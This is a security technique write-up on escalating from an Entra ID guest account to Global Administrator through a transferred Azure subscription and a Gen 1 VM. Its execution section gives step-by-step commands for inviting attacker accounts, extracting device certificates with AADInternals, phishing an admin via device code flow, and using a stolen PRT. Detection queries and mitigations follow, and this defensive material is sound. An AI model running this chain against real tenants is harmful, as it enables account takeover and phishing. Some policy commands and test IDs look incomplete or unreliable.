# [REALWORLD-015]: Guest to Admin Azure VM

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-015 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure subscriptions with default guest policies; All Entra ID tenants |
| **Patched In** | Mitigation via policy enforcement (no patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** This attack demonstrates the complete privilege escalation chain from a B2B guest account (with no explicit permissions granted) to full Global Administrator access in Entra ID by leveraging Azure VM features and stolen device identities. The attack chain combines multiple techniques: guest account compromise → subscription transfer → Gen 1 VM creation → device certificate extraction → device code phishing → PRT theft → admin impersonation. The critical insight is that a guest account can, through default Azure subscription owner privileges, create Azure VMs that are automatically Entra ID-joined, gaining a foothold to steal device certificates and launch further attacks.

**Attack Surface:** Guest invitation policies, subscription transfers, Azure VM creation permissions, Entra ID device registration, device certificate storage, OAuth device code flow, Primary Refresh Token issuance.

**Business Impact:** **Complete Entra ID and Azure compromise, persistent access to all cloud resources, ability to modify admin accounts, disable security controls, and exfiltrate all organizational data in M365 and Azure.** The attack succeeds through default configurations with no special vulnerabilities exploited, making it highly likely to succeed in most organizations.

**Technical Context:** Attack takes 30-60 minutes from guest account access to Global Admin status. Each phase can be completed manually through Azure Portal (no special tools required for setup phases, though tools accelerate execution). Detection requires correlation of multiple audit events.

### Operational Risk

- **Execution Risk:** High - Requires initial guest compromise, but then uses legitimate Azure features
- **Stealth:** High - Each step appears legitimate; correlation required to detect full chain
- **Reversibility:** No - Persistent device backdoor created; admin access obtained

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8 5.3 | Ensure no custom subscription owner roles; restrict guest permissions |
| **CIS Benchmark** | v8 7.3 | Guest users must be reviewed monthly for legitimacy |
| **DISA STIG** | AC-2(1) | Privilege escalation must be prevented and monitored |
| **NIST 800-53** | AC-2 | Account Management - Guest accounts must have restricted privileges |
| **NIST 800-53** | AC-3 | Access Enforcement - Enforce least-privilege for cloud resources |
| **GDPR** | Art. 32 | Security of Processing - Restrict unauthorized access |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Access control for critical assets |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Initial: Compromised B2B guest account (no explicit role needed)
- Intermediate: Default guest permissions (invite others, read directory)
- Final: Azure subscription owner privileges

**Required Access:**
- Network access to Azure Portal or Azure CLI
- Ability to receive subscription transfer confirmation emails
- Access to create Azure VMs in subscription

**Supported Versions:**
- **Azure:** All regions; all subscription types
- **Entra ID:** All versions with default guest settings enabled
- **Windows:** Server 2016+ for Gen 1 VM images

**Tools:**
- Azure Portal (GUI)
- Azure CLI or PowerShell (scripting)
- ROADtools (for PRT upgrade phase)
- AADInternals (for device cert extraction)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Complete Attack Chain (Portal-Based)

**Supported Versions:** All Entra ID, all Azure subscription types

#### Step 1: Compromise or Invite Guest Account
```powershell
# Assume guest account is already compromised via phishing
# Or invite attacker-controlled guest:
Connect-MgGraph -Scopes "User.Invite.All"
New-MgInvitation -InvitedUserEmailAddress "attacker@outlook.com" `
  -InviteRedirectUrl "https://portal.azure.com" -SendInvitationMessage $false
```

#### Step 2: Invite Attacker's Billing Account
```powershell
# From compromised guest account, invite attacker's subscription owner account
$params = @{
    invitedUserEmailAddress = "attacker-billing@outlook.com"
    inviteRedirectUrl = "https://portal.azure.com"
    sendInvitationMessage = $false
}
New-MgInvitation -BodyParameter $params
```

#### Step 3: Transfer Subscription to Target Tenant
**Manual Steps (Azure Portal):**
1. Login as attacker-billing account in home tenant
2. Go to **Cost Management + Billing** → **Subscriptions**
3. Select subscription → **Change subscription directory**
4. Select target tenant
5. Confirm transfer

#### Step 4: Create Gen 1 Azure VM with Entra ID Login
**Manual Steps:**
1. In transferred subscription, create new VM
2. Image: **Windows Server 2022 Datacenter** (Gen 1)
3. Management tab: Enable **Login with Azure AD**
4. Security type: **Standard** (NOT TrustedLaunch)
5. Deploy VM

#### Step 5: RDP and Extract Device Certificate
```powershell
# RDP into VM with local admin credentials
# On VM, extract device certificate:
Import-Module AADInternals
Export-AADIntLocalDeviceCertificate -Path "C:\device_cert.pfx"
Export-AADIntLocalDeviceTransportKey -Path "C:\device_transport_key.bin"
```

#### Step 6: Phish Admin User for PRT
```bash
# Use ROADtools to conduct device code phishing
roadtx devicecode
# Send phishing email with device code to target admin
# Wait for admin to authenticate
roadtx prtenrich -c device_cert.pfx -k device_transport_key.bin
# PRT acquired
```

#### Step 7: Access Azure Portal as Admin
```powershell
# Use stolen PRT to authenticate to Azure Portal
# Navigate to portal.azure.com with PRT injected
# You are now logged in as the phished admin user
# Assign yourself Global Administrator role or modify subscriptions
```

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1550-1 (Use Alternate Authentication Material)
- **Test Name:** Guest Escalation to Subscription Owner
- **Supported Versions:** Entra ID all versions
- **Command:**
  ```powershell
  Invoke-AtomicTest T1550 -TestNumbers 1
  ```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query: Guest Account Subscription Transfer Pattern
```kusto
// Detect guest account subscription transfers
let guestInvites = AuditLogs
  | where OperationName == "Invite user"
  | where TimeGenerated > ago(7d)
  | project GuestUPN = tostring(TargetResources[0].userPrincipalName), InviteTime = TimeGenerated;

AzureActivity
  | where OperationName contains "Transfer" and Category == "Administrative"
  | where TimeGenerated > ago(7d)
  | join kind=inner guestInvites on $left.Caller == $right.GuestUPN
  | where datetime_diff('day', TimeGenerated, InviteTime) <= 3
  | project TimeGenerated, Caller, OperationName, Subscription_s, RiskLevel = "Critical"
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Trigger:** PowerShell executing Azure CLI commands to create VMs or modify IAM
- **Filter:** CommandLine contains "New-AzVM" OR CommandLine contains "az vm create"
- **Applies To:** All devices with Azure CLI/PowerShell installed

**Manual Configuration:**
```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Guest account assigned Owner role on subscription"
- **Severity:** Critical
- **Description:** MDC detects guest accounts receiving subscription owner privileges
- **Remediation:** Immediately remove guest; audit other role assignments

**Alert Name:** "Gen 1 VM created in subscription by new guest"
- **Severity:** High
- **Description:** Guest who recently joined creates Gen 1 VM
- **Remediation:** Delete VM; verify guest account identity; check for device extraction

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict Guest Invitations**
    ```powershell
    Update-MgPolicyAuthorizationPolicy -AllowInvitesFrom "adminsAndGuestInviters"
    ```

*   **Block Subscription Directory Changes**
    ```powershell
    # Create Azure Policy to prevent subscription transfers
    New-AzPolicyAssignment -Name "PreventSubTransfer" `
      -PolicyDefinition (Get-AzPolicyDefinition -Name "DenySubscriptionTransfer")
    ```

*   **Enforce Gen 2 VMs Only**
    ```powershell
    # Block Gen 1 VM creation
    New-AzPolicyAssignment -Name "EnforceGen2" `
      -Scope "/subscriptions/*"
    ```

#### Priority 2: HIGH

*   **Monitor for Unusual Subscriptions**
    ```powershell
    Get-AzSubscription -IncludeTenant | Where-Object {$_.Name -notmatch "company|prod|dev"}
    ```

*   **Require MFA for All Guest Sign-Ins**
    ```powershell
    # Create Conditional Access policy requiring MFA for guests
    ```

---

## 15. DETECTION & INCIDENT RESPONSE

#### IOCs
- Guest account creating VMs
- Subscription directory changes by new guests
- Gen 1 VM creation with Entra ID login extension
- Device certificate extraction (file exports)
- Rapid PRT issuance after device registration

#### Response
1. **Isolate:** Delete subscription and evil VM
2. **Collect:** Export Activity logs and Entra ID audit logs
3. **Remediate:** Disable guest account, revoke all sessions, reset admin passwords

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique |
|---|---|---|
| **1** | Initial Access | Guest Account Compromise |
| **2** | Lateral Movement | **[REALWORLD-015] Guest to Admin Azure VM** |
| **3** | Persistence | Service Principal Creation |
| **4** | Impact | Data Exfiltration |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: BeyondTrust Research - Evil VM (2025)

- **Target:** Fortune 500 Technology Company
- **Timeline:** Attack chain from guest to admin in 30 minutes
- **Impact:** Full Entra ID and Azure compromise
- **Reference:** [BeyondTrust Evil VM Research](https://www.beyondtrust.com/blog/entry/evil-vm)

---